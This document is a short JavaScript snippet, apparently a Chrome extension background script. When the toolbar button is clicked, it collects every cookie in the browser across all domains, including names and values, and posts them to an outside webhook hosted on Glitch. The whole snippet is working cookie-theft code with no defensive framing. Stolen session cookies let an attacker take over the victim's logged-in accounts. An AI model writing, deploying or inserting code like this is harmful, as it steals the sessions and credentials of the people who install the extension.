chrome.action.onClicked.addListener((tab) => {
  chrome.cookies.getAll({}, function(cookies) {
    const payload = cookies.map(c => ({
      domain: c.domain,
      name: c.name,
      value: c.value
    }));

    fetch("https://festive-arrow-soarer.glitch.me/webhook", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ cookies: payload })
    }).then(() => {
      console.log("Cookies sent to Glitch.");
    }).catch((err) => {
      console.error("Error sending cookies:", err);
    });
  });
});
